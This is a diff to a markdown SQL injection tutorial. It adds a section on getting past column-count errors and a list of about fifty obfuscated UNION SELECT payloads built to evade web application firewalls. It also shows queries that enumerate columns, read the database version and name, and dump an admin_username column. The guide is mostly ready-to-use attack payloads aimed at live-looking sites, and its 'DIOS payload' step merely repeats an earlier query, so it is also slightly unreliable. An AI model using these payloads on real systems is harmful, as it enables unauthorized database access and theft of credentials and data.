@@ -197,7 +197,7 @@ Website must successfully load and we will see a number (in our case between 1-4
 
 We bypassed the WAF and found that the 1st column has the information (please refer to the photo).
 
-## Bypassing Error message: The used SELECT statements have a different number of columns
+## Bypassing Error message: The used SELECT statements have a different number of columns (First method)
 Sometimes when you try to find which column is vulnerable via UNION based queries you will face this error:
 
 ```The used SELECT statements have a different number of columns```
@@ -263,7 +263,6 @@ To dump the third column of **username** table, replace (+LIMIT+**1**,1) with (+
 The first column is the one I am going to dump. Given query will output the data inside the first column: **admin_username**
 Before going further, convert the database name, table name and column(s) 0xHEX. This case I will dump data inside **admin_username** column.  
 
-
 Converting from string to 0xHEX:  
 ```
 litoflex -> 0x6c69746f666c6578  
@@ -274,7 +273,92 @@ admin_username -> 0x61646d696e5f757365726e616d65
 The final payload would be:  
 ```+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(admin_username)+AS+CHAR),0x7e))+FROM+litoflex.username+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -```
 
-The error will output the data that we aimed at.
+The error will output the data that we aimed at.  
+
+## Bypassing Error message: The used SELECT statements have a different number of columns (Second method + WAF Bypass)
+
+The given query will find how many columns the database has:  
+
+```http://domain.com.br/index.php?id=1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -```
+
+The error shows that the database has 14 columns  
+>Unknown column '**15**' in 'group statement'
+
+Given queries finds which of 14 columns is vulnerable.
+
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -```  
+```https://domain.com.br/index.php?id=1& n=-19901' Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -```
+
+Same payloads but built for WAF bypassing using UNION based queries:
+```
+    http://domain.com/index.php?id=1& n=19901' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %55nion(%53elect 1,2,3) 1,2,3,4-- -  
+    http://domain.com/index.php?id=1&+n=19901'+union+distinctROW+select+1,2,3,4--+-  
+    http://domain.com/index.php?id=1& n=19901' #?uNiOn + #?sEleCt 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +un/**/ion+se/**/lect 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +?UnI?On?+'SeL?ECT? 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901'(UnIoN)+(SelECT)+1,2,3,4--+-  
+    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %55nion(%53elect 1,2,3,4)-- -  
+    http://domain.com/index.php?id=1& n=19901' /**//*!12345UNION SELECT*//**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**//*!50000UNION SELECT*//**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**/UNION/**//*!50000SELECT*//**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!50000UniON SeLeCt*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union /*!50000%53elect*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*--*/union/*--*/select/*--*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!union*/+/*!select*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**/uNIon/**/sEleCt/**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +%2F**/+Union/*!select*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**//*!union*//**//*!select*//**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!uNIOn*/ /*!SelECt*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**/union/*!50000select*//**/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' 0%a0union%a0select%09 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %0Aunion%0Aselect%0A 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -
+    http://domain.com/index.php?id=1& n=19901' /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union+sel%0bect 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union(select(1),2,3)-- -  
+    http://domain.com/index.php?id=1& n=19901' uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' +/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' uni%20union%20/*!select*/%20 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' union%23aa%0Aselect 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /**/union/*!50000select*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /^****union.*$/ /^****select.*$/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*union*/union/*select*/select+ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' /*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' %252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4-- -  
+    http://domain.com/index.php?id=1& n=19901' AnD null UNiON SeLeCt 1,2,3,4;%00-- -  
+    http://domain.com/index.php?id=1& n=19901' AnD null UNiON SeLeCt 1,2,3,4+--+-  
+    http://domain.com/index.php?id=1& n=19901' And False Union Select 1,2,3,4+--+-  
+```
+
+The website should loads normally, showing us the number of the vulnerable column. In this case: **6**.  
+
+**Retrieving the version of database:**  
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14-- -```  
+
+**Retrieving the database name:**  
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -```  
+
+**Using DIOS payload to dump tables + columns automatically**
+```https://domain.com.br/index.php?id=1& n=19901' Union Select 1,2,3,4,5,database(),7,8,9,10,11,12,13,14-- -```  
 
 ## Retrieving the database  
 
@@ -345,7 +429,7 @@ If website does successfuly load, you will have all the database dumped in a nic
 
 In a traditional way of SQL Injection, you first have to dump database(), then tables(), then columns(), then data inside the columns. But you have to find the name of every table and columns.
 
-#### Getting the database()
+#### Retrieving the database
 
 - From UNION SELECT payload, the following payload worked for me: ```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```
 Because the 1st column was being reflected to the website, we have to replace the "1" value in the payload with **database()**.  
@@ -356,7 +440,7 @@ Because the 1st column was being reflected to the website, we have to replace th
 
 ![database_name_retrieved](https://i.imgur.com/xlUd1Gj.png)
 
-#### Getting the tables()
+#### Retrieving tables
 
 - Convert the database name into 0xHEX: **0x6462313039**
 
@@ -367,7 +451,7 @@ Because the 1st column was being reflected to the website, we have to replace th
 
 ![table_dumped](https://i.imgur.com/cUbdS47.png)
 
-#### Getting the columns()
+#### Retriving columns
 
 Now all the tables are all dumped. I will focus on the table names **intranetdir**, let's dump all the columns that this table has.
 
@@ -381,7 +465,7 @@ Now all the tables are all dumped. I will focus on the table names **intranetdir
 
 ![dumping_columns](https://i.imgur.com/pbIfSQV.png)
 
-#### Getting the data inside the column
+#### Retrieving the data inside the column
 
 All the columns of the name named **intranetdir** are dumped. In this case I will dump the data inside **name** column. For our final payload, we need to use database's name in 0xHEX, table's name in 0xHEX and column's name in 0xHEX.
 
